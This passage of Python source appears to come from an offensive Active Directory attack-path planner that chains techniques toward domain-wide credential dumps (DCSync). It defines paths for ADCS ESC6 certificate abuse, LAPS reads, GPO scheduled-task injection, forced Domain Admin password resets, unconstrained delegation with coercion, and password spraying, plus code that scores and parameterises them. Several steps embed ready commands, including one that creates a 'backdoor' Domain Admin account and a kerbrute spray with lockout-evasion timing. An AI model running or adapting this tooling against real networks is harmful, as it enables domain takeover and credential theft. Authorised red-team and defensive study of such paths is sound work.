                label="Enroll DA Certificate with SAN", mitre="T1649",
                description="Request certificate for template specifying Domain Admin UPN as Subject Alternative Name",
                edge_type="ENROLL", src_label="Domain User", tgt_label="Certificate Authority",
                loot_produces="da_certificate",
            ),
            StepDef(
                technique_id="certipy_auth",
                label="PKINIT Auth → TGT as DA → DCSync", mitre="T1558.001",
                description="Use forged DA certificate for PKINIT Kerberos authentication, retrieve DA TGT and NT hash, then DCSync",
                edge_type="DCSYNC", src_label="DA Certificate", tgt_label="Domain Controller",
                loot_produces="da_hashes",
            ),
        ],
    ),

    AttackPathDef(
        id="adcs_esc6_altname_flag",
        name="ADCS ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 → DA Cert → DCSync",
        description="CA configured with EDITF_ATTRIBUTESUBJECTALTNAME2 allows any enrollable template to specify arbitrary SAN — request a DA cert directly",
        confidence=0.86,
        situations=["DOMAIN_USER"],
        tags=["adcs", "esc6", "certificate", "ca-misconfiguration", "san"],
        steps=[
            StepDef(
                technique_id="certipy_find",
                label="Find CA with EDITF_ATTRIBUTESUBJECTALTNAME2", mitre="T1649",
                description="Enumerate CA configuration flags using Certipy — look for EDITF_ATTRIBUTESUBJECTALTNAME2 on the CA itself",
                edge_type="MEMBER_OF", src_label="Domain User", tgt_label="Certificate Authority",
                loot_produces="vuln_ca_name",
            ),
            StepDef(
                technique_id="certipy_req",
                label="Enroll Any Template with DA SAN", mitre="T1649",
                description="Request any enrollable certificate template specifying Domain Admin UPN as SAN — CA honors it due to flag",
                edge_type="ENROLL", src_label="Domain User", tgt_label="Certificate Authority",
                loot_produces="da_certificate",
            ),
            StepDef(
                technique_id="certipy_auth",
                label="PKINIT → NT Hash → DCSync", mitre="T1558.001",
                description="Authenticate with DA certificate via PKINIT, extract NT hash via PKINIT UnPAC-the-hash, perform DCSync",
                edge_type="DCSYNC", src_label="DA Certificate", tgt_label="Domain Controller",
                loot_produces="da_hashes",
            ),
        ],
    ),

    AttackPathDef(
        id="laps_read_local_admin_dcsync",
        name="LAPS Read → Local Admin → LSA Secrets → DA",
        description="Read LAPS managed local admin passwords from AD, use them to gain local admin on machines, dump LSA secrets and cached domain creds",
        confidence=0.82,
        situations=["DOMAIN_USER"],
        tags=["laps", "local-admin", "credential-access", "lsa-secrets"],
        steps=[
            StepDef(
                technique_id="laps_dump",
                label="Read LAPS Passwords from AD", mitre="T1552.004",
                description="Enumerate ms-Mcs-AdmPwd attribute on computer objects — readable if current user has delegated LAPS read access",
                edge_type="READ_ATTR", src_label="Domain User", tgt_label="Computer Objects (LAPS)",
                loot_produces="cleartext_creds",
            ),
            StepDef(
                technique_id="wmiexec",
                label="WMI Exec as Local Admin → Code Execution", mitre="T1047",
                description="Use LAPS local admin credentials to execute commands on the target machine via WMI",
                edge_type="LOCAL_ADMIN", src_label="LAPS Local Admin", tgt_label="Domain-joined Machine",
                loot_produces="shell_access",
            ),
            StepDef(
                technique_id="secretsdump",
                label="Dump LSA Secrets + Cached Domain Creds", mitre="T1003.004",
                description="Dump LSA secrets and cached domain credentials from the local machine — often contains domain service account or admin hashes",
                edge_type="ADMIN_TO", src_label="Local Admin Shell", tgt_label="LSA / Registry",
                loot_produces="nt_hashes",
            ),
            StepDef(
                technique_id="dcsync",
                label="DCSync with Obtained DA Hash", mitre="T1003.006",
                description="Use any domain admin hash or account found in LSA secrets to DCSync the entire domain",
                edge_type="DCSYNC", src_label="DA Hash / Creds", tgt_label="Domain Controller",
                loot_produces="da_hashes",
            ),
        ],
    ),

    AttackPathDef(
        id="gpo_abuse_scheduled_task",
        name="GPO Abuse — WriteDacl → Malicious Scheduled Task → SYSTEM → DCSync",
        description="Exploit write permissions on a Group Policy Object to inject a malicious scheduled task on domain controllers, achieve SYSTEM, dump creds",
        confidence=0.83,
        situations=["DOMAIN_USER"],
        tags=["gpo", "group-policy", "scheduled-task", "dacl-abuse", "writedacl"],
        steps=[
            StepDef(
                technique_id="gpo_enum",
                label="Enumerate GPOs with Write Permissions", mitre="T1484.001",
                description="Use BloodHound/ldapdomaindump to find GPOs where current user has WriteDacl/WriteOwner/GenericWrite — especially GPOs linked to DCs",
                edge_type="WRITE_DACL", src_label="Domain User", tgt_label="Group Policy Object",
                loot_produces="vuln_gpo_id",
            ),
            StepDef(
                technique_id="gpo_inject",
                label="Inject Malicious Scheduled Task into GPO", mitre="T1484.001",
                description="Use SharpGPOAbuse or pyGPOAbuse to add a scheduled task that runs as SYSTEM, exfiltrating creds or adding domain admin",
                edge_type="WRITE_DACL", src_label="Attacker (GPO Write)", tgt_label="DC Scheduled Tasks",
                loot_produces="shell_access",
                is_manual=True,
                manual_prompt="Run: python3 pygpoabuse.py <DOMAIN>/<USER>:<PASS> -gpo-id <GPO_ID> -command 'net user backdoor P@ssw0rd /add && net group \"Domain Admins\" backdoor /add'",
            ),
            StepDef(
                technique_id="secretsdump",
                label="Dump DC Secrets via Backdoor Account", mitre="T1003.002",
                description="Use the injected backdoor domain admin account to DCSync or dump DC secrets remotely",
                edge_type="DCSYNC", src_label="Backdoor DA Account", tgt_label="Domain Controller",
                loot_produces="da_hashes",
            ),
        ],
    ),

    AttackPathDef(
        id="genericall_reset_da_password",
        name="GenericAll → Reset DA Password → Authenticate as DA",
        description="Exploit GenericAll ACL on a Domain Admin account to reset their password and authenticate directly",
        confidence=0.91,
        situations=["DOMAIN_USER", "HASH_ONLY"],
        tags=["acl", "genericall", "password-reset", "dacl-abuse"],
        steps=[
            StepDef(
                technique_id="acl_enum",
                label="Find GenericAll ACE on DA Account", mitre="T1087.002",
                description="BloodHound or ldap query to find GenericAll/GenericWrite/ForceChangePassword ACE on any Domain Admin account owned by current principal",
                edge_type="GENERIC_ALL", src_label="Domain User", tgt_label="Domain Admin Account",
                loot_produces="target_da_account",
            ),
            StepDef(
                technique_id="password_reset",
                label="Force Reset DA Account Password", mitre="T1098.001",
                description="Use net rpc password or rpcclient to force-change the DA account password to attacker-controlled value",
                edge_type="GENERIC_ALL", src_label="Attacker (GenericAll)", tgt_label="DA Account",
                loot_produces="cleartext_creds",
                is_manual=True,
                manual_prompt="Run: net rpc password <DA_USER> <NEW_PASS> -U <DOMAIN>/<YOUR_USER>%<YOUR_PASS> -S <DC_IP>",
            ),
            StepDef(
                technique_id="dcsync",
                label="DCSync as Compromised DA", mitre="T1003.006",
                description="Authenticate as the reset DA account and DCSync the entire domain credential store",
                edge_type="DCSYNC", src_label="Compromised DA", tgt_label="Domain Controller",
                loot_produces="da_hashes",
            ),
        ],
    ),

    AttackPathDef(
        id="unconstrained_delegation_coerce",
        name="Unconstrained Delegation + Coercion → DC TGT → DCSync",
        description="Find computer with unconstrained delegation, set up TGT capture listener, coerce DC auth, extract DC TGT, DCSync",
        confidence=0.90,
        situations=["DOMAIN_USER", "LOCAL_ADMIN"],
        tags=["delegation", "unconstrained", "tgt-capture", "coercion", "printnightmare"],
        steps=[
            StepDef(
                technique_id="delegation_enum",
                label="Find Unconstrained Delegation Hosts", mitre="T1558.001",
                description="LDAP query for computer accounts with TRUSTED_FOR_DELEGATION flag set (unconstrained delegation) — these capture TGTs from authenticating machines",
                edge_type="ALLOWED_TO_DELEGATE", src_label="Domain User", tgt_label="Unconstrained Delegation Host",
                loot_produces="target_host",
            ),
            StepDef(
                technique_id="rubeus_monitor",
                label="Start TGT Capture Monitor on Delegation Host", mitre="T1558.001",
                description="Run Rubeus monitor on the unconstrained delegation host to capture incoming Kerberos TGTs from authenticating machines",
                edge_type="LOCAL_ADMIN", src_label="Local Admin on Deleg Host", tgt_label="Kerberos TGT Stream",
                loot_produces="tgt_monitor",
                is_manual=True,
                manual_prompt="On delegation host: Rubeus.exe monitor /interval:5 /nowrap\nOr: python3 krbrelayx.py --krbsalt <DOMAIN_UPPER>\\\\<MACHINE>$ --krbpass <MACHINE_PASS>",
            ),
            StepDef(
                technique_id="coerce",
                label="Coerce DC Auth to Delegation Host (PrinterBug/PetitPotam)", mitre="T1187",
                description="Force the Domain Controller to authenticate to the unconstrained delegation host via PrinterBug or PetitPotam — its TGT will be captured",
                edge_type="COERCION", src_label="Attacker", tgt_label="Domain Controller",
                loot_produces="ccache_ticket",
            ),
            StepDef(
                technique_id="dcsync",
                label="Pass-the-Ticket → DCSync", mitre="T1003.006",
                description="Use captured DC TGT to impersonate the Domain Controller and perform DCSync to dump all domain credentials",
                edge_type="DCSYNC", src_label="DC TGT (Kerberos)", tgt_label="Domain Controller",
                loot_produces="da_hashes",
            ),
        ],
    ),

    AttackPathDef(
        id="password_spray_escalate",
        name="Password Spray → Domain User → Kerberoast / ADCS Escalation",
        description="Spray common AD passwords across domain accounts, gain initial foothold as domain user, then escalate via Kerberoasting or ADCS",
        confidence=0.70,
        situations=["ANON"],
        tags=["password-spray", "initial-access", "brute-force", "low-and-slow"],
        steps=[
            StepDef(
                technique_id="user_enum",
                label="Enumerate Valid Domain Usernames (Kerberos/LDAP)", mitre="T1087.002",
                description="Use kerbrute or ldap null-session to enumerate valid domain usernames without authentication",
                edge_type="MEMBER_OF", src_label="Attacker (No Creds)", tgt_label="Domain Users List",
                loot_produces="user_list",
            ),
            StepDef(
                technique_id="password_spray",
                label="Spray Common Passwords (Low-and-Slow)", mitre="T1110.003",
                description="Spray 1-2 passwords per account per lockout window: Password1, Welcome1, <Company>2024, Passw0rd. Use kerbrute or sprayhound.",
                edge_type="MEMBER_OF", src_label="Username List", tgt_label="Domain Account",
                loot_produces="cleartext_creds",
                is_manual=True,
                manual_prompt="Run: kerbrute passwordspray --dc <DC_IP> -d <DOMAIN> users.txt 'Password1'\nWait lockout window (default 30min) between sprays",
            ),
            StepDef(
                technique_id="kerberoast",
                label="Kerberoast + Crack for Service Account Escalation", mitre="T1558.003",
                description="With domain user foothold, request SPNs for service accounts and crack offline to escalate to privileged accounts",
                edge_type="MEMBER_OF", src_label="Domain User Foothold", tgt_label="Service Account Hash",
                loot_produces="kerberos_hashes",
            ),
            StepDef(
                technique_id="dcsync",
                label="DCSync via Cracked Service / Admin Account", mitre="T1003.006",
                description="Use cracked service account credentials (especially if DA-equivalent) to DCSync the domain",
                edge_type="DCSYNC", src_label="Privileged Creds", tgt_label="Domain Controller",
                loot_produces="da_hashes",
            ),
        ],
    ),
]

# ─── Selector ────────────────────────────────────────────────────────────────

_SITUATION_MAP: dict[str, list[str]] = {
    "ANON": [
        "asrep_crack_kerberoast_dcsync",
        "samrdump_asrep_crack_dcsync",
        "password_spray_escalate",
        "printerbug_petitpotam_coerce_relay",
        "ntlm_relay_ldap_dcsync",
        "adcs_esc8_relay_cert",
        "zerologon_cve_2020_1472",
    ],
    "DOMAIN_USER": [
        "adcs_esc1_cert_da",
        "adcs_esc4_template_write",
        "adcs_esc6_altname_flag",
        "shadow_credentials_pkinit",
        "rbcd_coercion_impersonation",
        "unconstrained_delegation_coerce",
        "delegation_getst_dcsync",
        "nopac_samaccountname_spoof",
        "ntlm_relay_ldap_dcsync",
        "genericall_reset_da_password",
        "gpo_abuse_scheduled_task",
        "laps_read_local_admin_dcsync",
        "kerberoast_pth_dcsync",
        "asrep_crack_kerberoast_dcsync",
        "gmsa_read_pth_da",
        "acl_writedacl_dcsync",
        "sccm_naa_creds",
        "golden_ticket",
    ],
    "HASH_ONLY": [
        "pth_direct_dcsync",
        "delegation_getst_dcsync",
        "trust_escalation_extrasid",
        "genericall_reset_da_password",
        "acl_writedacl_dcsync",
    ],
    "LOCAL_ADMIN": [
        "local_admin_cache_dcsync",
        "unconstrained_delegation_coerce",
        "pth_direct_dcsync",
        "laps_read_local_admin_dcsync",
        "sccm_naa_creds",
    ],
    "SVC_ACCT": [
        "svc_acct_delegation",
        "delegation_getst_dcsync",
        "unconstrained_delegation_coerce",
        "kerberoast_pth_dcsync",
        "shadow_credentials_pkinit",
    ],
    "TRUST": [
        "trust_escalation_extrasid",
        "golden_ticket",
    ],
}

_PATH_LOOKUP = {p.id: p for p in ALL_PATHS}


def _fingerprint_environment(analyzer) -> dict:
    """Build environment capability fingerprint from the loaded graph.
    Returns empty dict if analyzer is None or graph is empty.
    """
    if analyzer is None or analyzer.graph.number_of_nodes() == 0:
        return {}

    edge_types: set[str] = {
        data.get("edge_type", "")
        for _, _, data in analyzer.graph.edges(data=True)
    }
    entity_types: set[str] = {
        str(meta.get("entity_type") or meta.get("type") or "")
        for meta in analyzer.entity_meta.values()
    }

    try:
        has_unconstrained = bool(analyzer.detect_unconstrained_delegation())
    except Exception:
        has_unconstrained = False

    try:
        adcs_paths = analyzer.detect_adcs_paths()
    except Exception:
        adcs_paths = []
    adcs_by_type: set[str] = {p.esc_type for p in adcs_paths} if adcs_paths else set()

    try:
        kerb_paths = analyzer.detect_kerberoastable_paths()
    except Exception:
        kerb_paths = []

    try:
        cross = analyzer.get_cross_domain_paths(max_paths=1)
    except Exception:
        cross = []

    dc_count = sum(
        1 for m in analyzer.entity_meta.values()
        if "DC" in str(m.get("entity_type") or m.get("type") or "").upper()
    )

    has_laps = any(
        "laps" in str(m.get("attributes") or {}).lower()
        for m in analyzer.entity_meta.values()
    )
    has_gpo = "GPO" in entity_types
    has_sccm = any("sccm" in str(m).lower() for m in analyzer.entity_meta.values())

    return {
        "has_adcs": bool(adcs_paths) or "CA" in entity_types,
        "adcs_esc1": "ESC1" in adcs_by_type,
        "adcs_esc2": "ESC2" in adcs_by_type,
        "adcs_esc4": "ESC4" in adcs_by_type,
        "adcs_esc6": "ESC6" in adcs_by_type,
        "adcs_esc8": "ESC8" in adcs_by_type,
        "has_delegation": "ALLOWED_TO_DELEGATE" in edge_types,
        "has_rbcd": "ALLOWED_TO_ACT" in edge_types,
        "has_unconstrained": has_unconstrained,
        "has_trusts": "TRUSTS" in edge_types or "EXTRASID" in edge_types,
        "has_cross_domain": bool(cross),
        "has_laps": has_laps,
        "has_gpo": has_gpo,
        "has_sccm": has_sccm,
        "has_kerberoastable": bool(kerb_paths),
        "has_shadow_creds": bool(edge_types & {"ADD_KEY_CREDENTIAL_LINK", "WRITE_KEY_CREDENTIALS", "ADD_KEY_CREDENTIALS"}),
        "has_acl_write": bool(edge_types & {"WRITE_DACL", "WRITE_OWNER", "GENERIC_WRITE", "GENERIC_ALL"}),
        "dc_count": dc_count,
        "total_nodes": analyzer.graph.number_of_nodes(),
        "total_edges": analyzer.graph.number_of_edges(),
    }


def _score_path_for_environment(path: "AttackPathDef", env: dict) -> float:
    """Adjust path confidence based on what capabilities are actually in the graph.
    Returns path.confidence unchanged if env is empty (no graph data).
    """
    if not env:
        return path.confidence

    score = path.confidence
    pid = path.id

    if "adcs_esc1" in pid:
        score += 0.20 if env.get("adcs_esc1") else (-0.40 if not env.get("has_adcs") else -0.10)
    elif "adcs_esc8" in pid:
        score += 0.15 if env.get("adcs_esc8") else (-0.40 if not env.get("has_adcs") else -0.15)
    elif "adcs_esc4" in pid:
        score += 0.12 if env.get("adcs_esc4") else (-0.35 if not env.get("has_adcs") else -0.10)
    elif "adcs_esc6" in pid:
        score += 0.12 if env.get("adcs_esc6") else (-0.30 if not env.get("has_adcs") else -0.08)
    elif "adcs" in pid:
        if not env.get("has_adcs"):
            score -= 0.25

    if "delegation" in pid and "unconstrained" not in pid:
        score += 0.15 if env.get("has_delegation") else -0.35
    if "rbcd" in pid:
        score += 0.15 if env.get("has_rbcd") else -0.40
    if "unconstrained" in pid:
        score += 0.20 if env.get("has_unconstrained") else -0.45

    if "trust" in pid or "extrasid" in pid:
        score += 0.25 if env.get("has_trusts") else -0.50

    if "kerberoast" in pid:
        score += 0.10 if env.get("has_kerberoastable") else -0.15

    if "shadow" in pid:
        score += 0.15 if env.get("has_shadow_creds") else -0.30

    if "acl" in pid or "writedacl" in pid or "genericall" in pid:
        score += 0.10 if env.get("has_acl_write") else -0.20

    if "laps" in pid:
        score += 0.15 if env.get("has_laps") else -0.40
    if "gpo" in pid:
        score += 0.10 if env.get("has_gpo") else -0.30
    if "sccm" in pid:
        score += 0.10 if env.get("has_sccm") else -0.45
    if any(x in pid for x in ("ntlm_relay", "printerbug", "petitpotam")):
        score += 0.08 if env.get("dc_count", 0) > 0 else -0.25

    return max(0.0, min(1.0, score))


def _get_graph_paths(analyzer, max_paths: int = 5) -> list[dict]:
    """Return real graph-derived attack paths to tier-0 (edge chains, no tool steps).
    Returns empty list if no graph or on any error.
    """
    if analyzer is None or analyzer.graph.number_of_nodes() == 0:
        return []
    try:
        # pick up to 5 non-tier0 source nodes — highest-degree first for best coverage
        tier0_set = analyzer.get_tier0_nodes()
        non_tier0 = [n for n in analyzer.graph.nodes() if n not in tier0_set]
        candidate_sources = sorted(non_tier0, key=lambda n: analyzer.graph.degree(n), reverse=True)[:5]

        all_results: list = []
        seen_paths: set = set()
        for source_id in candidate_sources:
            raw = analyzer.get_paths_to_tier0(source_id, max_hops=6, max_paths=max_paths)
            for p in raw:
                key = tuple(p.path)
                if key not in seen_paths:
                    seen_paths.add(key)
                    all_results.append(p)

        # sort by score descending, take top max_paths
        all_results.sort(key=lambda p: p.path_score, reverse=True)
        all_results = all_results[:max_paths]

        result: list[dict] = []
        for p in all_results:
            path_ids: list[str] = p.path  # PathResult.path is List[str]
            edge_chain: list[dict] = []
            for i, node in enumerate(path_ids):
                if i + 1 < len(path_ids):
                    nxt = path_ids[i + 1]
                    etype = (analyzer.graph.get_edge_data(node, nxt) or {}).get("edge_type", "?")
                    edge_chain.append({
                        "from_id": node,
                        "from_label": analyzer._label_of(node),
                        "edge_type": etype,
                        "to_id": nxt,
                        "to_label": analyzer._label_of(nxt),
                    })
            result.append({
                "source_id": p.source_id,
                "target_id": p.target_id,
                "source_label": analyzer._label_of(path_ids[0]) if path_ids else "",
                "target_label": analyzer._label_of(path_ids[-1]) if path_ids else "",
                "hop_count": p.hop_count,
                "path_score": p.path_score,
                "edge_chain": edge_chain,
                "is_graph_derived": True,
            })
        return result
    except Exception as exc:
        log.debug("_get_graph_paths error: %s", exc)
        return []


def get_paths_for_situation(situation: str) -> list[AttackPathDef]:
    ids = _SITUATION_MAP.get(situation, _SITUATION_MAP["DOMAIN_USER"])
    return [_PATH_LOOKUP[pid] for pid in ids if pid in _PATH_LOOKUP]


def steps_to_dicts(
    path: AttackPathDef,
    target_ip: str,
    domain: str,
    auth: dict,
) -> list[dict[str, Any]]:
    result = []
    for i, s in enumerate(path.steps):
        step_target = target_ip
        result.append({
            "index": i,
            "technique_id": s.technique_id,
            "label": s.label,
            "description": s.description,
            "mitre": s.mitre,
            "edge_type": s.edge_type,
            "src_label": s.src_label,
            "tgt_label": s.tgt_label,
            "is_manual": s.is_manual,
            "manual_prompt": s.manual_prompt,
            "fallbacks": s.fallbacks,
            "loot_produces": s.loot_produces,
            "loot_requires": s.loot_requires,
            "target": step_target,
            "params": _build_params(s.technique_id, step_target, domain, auth),
        })
    return result


def _build_params(technique_id: str, target: str, domain: str, auth: dict) -> dict:
    base: dict[str, Any] = {
        "technique": technique_id,
        "target": target,
        "domain": domain,
        "username": auth.get("username", ""),
        "password": auth.get("password", ""),
        "hashes": auth.get("hashes", ""),
        "dc_ip": auth.get("dc_ip") or target,
    }
    if technique_id in ("kerberoast", "getuserspns"):
        fd, path = tempfile.mkstemp(prefix="kerberoast_chain_", suffix=".txt")
        os.close(fd)
        base["output_file"] = path
    elif technique_id in ("asreproast", "getnpusers"):
        fd, path = tempfile.mkstemp(prefix="asrep_chain_", suffix=".txt")
        os.close(fd)
        base["output_file"] = path
    elif technique_id == "dcsync":
        base["just_dc"] = True
    elif technique_id in ("wmiexec", "smbexec", "psexec", "atexec"):
        base["command"] = auth.get("command", "whoami /all && net user /domain")
    elif technique_id == "getst":
        base["spn"] = auth.get("spn", f"cifs/{target}")
        base["impersonate"] = auth.get("impersonate", "Administrator")
    elif technique_id == "getTGT":
        pass
    elif technique_id == "ticketer":
        base["domain_sid"] = auth.get("domain_sid", "")
        base["nthash"] = auth.get("krbtgt_hash", "")
        base["target_user"] = "Administrator"
    elif technique_id == "lookupsid":
        base["target_ip"] = target
    elif technique_id == "certipy_req":
        base["template"] = auth.get("template", "User")
        base["upn"] = auth.get("upn", f"Administrator@{domain}")
        if auth.get("ca"):
            base["ca"] = auth["ca"]
    elif technique_id == "certipy_auth":
        base["target_user"] = auth.get("target_user", "Administrator")
    return base


def resolve_path_to_steps(
    analyzer,
    target_ip: str,
    domain: str,
    auth_params: dict,
    situation: str = "DOMAIN_USER",
) -> tuple[list[dict[str, Any]], list[str], list[dict], list[dict]]:
    """
    Returns (primary_steps, path_nodes, all_paths_metadata, graph_paths).

    - primary_steps: dicts for the highest-confidence path (after env scoring)
    - path_nodes: human-readable node labels for the path
    - all_paths_metadata: summary of all available paths (id, name, env_score, step_count, tags)
    - graph_paths: real graph-derived edge-chain paths to tier-0
    """
    # If graph data exists, try to enrich path confidence based on what's actually present
    enriched_situation = _enrich_situation(analyzer, situation, auth_params)

    paths = get_paths_for_situation(enriched_situation)
    if not paths:
        paths = get_paths_for_situation("DOMAIN_USER")
    if not paths:
        return [], [], [], []

    # Fingerprint env and score each candidate path.
    # Only re-sort when graph data is available (env is non-empty);
    # otherwise preserve the curated situation order.
    env = _fingerprint_environment(analyzer)
    if env:
        scored = sorted(paths, key=lambda p: _score_path_for_environment(p, env), reverse=True)
    else:
        scored = paths

    primary = scored[0]
    primary_steps = steps_to_dicts(primary, target_ip, domain, auth_params)

    # Build path nodes from step labels
    path_nodes: list[str] = []
    for s in primary.steps:
        if not path_nodes:
            path_nodes.append(s.src_label)
        path_nodes.append(s.tgt_label)

    all_paths_meta = [
        {
            "id": p.id,
            "name": p.name,
            "description": p.description,
            "confidence": p.confidence,
            "env_score": _score_path_for_environment(p, env),
            "step_count": len(p.steps),
            "tags": p.tags,
            "situations": p.situations,
        }
        for p in scored
    ]

    graph_paths = _get_graph_paths(analyzer)

    return primary_steps, path_nodes, all_paths_meta, graph_paths


def get_path_steps(
    path_id: str,
    target_ip: str,
    domain: str,
    auth_params: dict,
) -> tuple[list[dict[str, Any]], list[str]]:
    path = _PATH_LOOKUP.get(path_id)
    if not path:
        fallback_paths = get_paths_for_situation("DOMAIN_USER")
        if not fallback_paths:
            return [], []
        path = fallback_paths[0]

    steps = steps_to_dicts(path, target_ip, domain, auth_params)
    nodes: list[str] = []
    for s in path.steps:
        if not nodes:
            nodes.append(s.src_label)
        nodes.append(s.tgt_label)
    return steps, nodes


def _enrich_situation(analyzer, situation: str, auth: dict) -> str:
    """
    Use graph data to potentially refine the situation or boost path confidence.
    Currently returns the input situation unchanged if no graph data available.
    """
    if analyzer is None or analyzer.graph.number_of_nodes() == 0:
        return situation

    # If graph has delegation edges, SVC_ACCT path becomes relevant
    has_deleg = any(
        data.get("edge_type") in ("ALLOWED_TO_DELEGATE", "ALLOWED_TO_ACT")
        for _, _, data in analyzer.graph.edges(data=True)
    )
    if has_deleg and situation in ("DOMAIN_USER", "HASH_ONLY"):
        return "SVC_ACCT"

    return situation
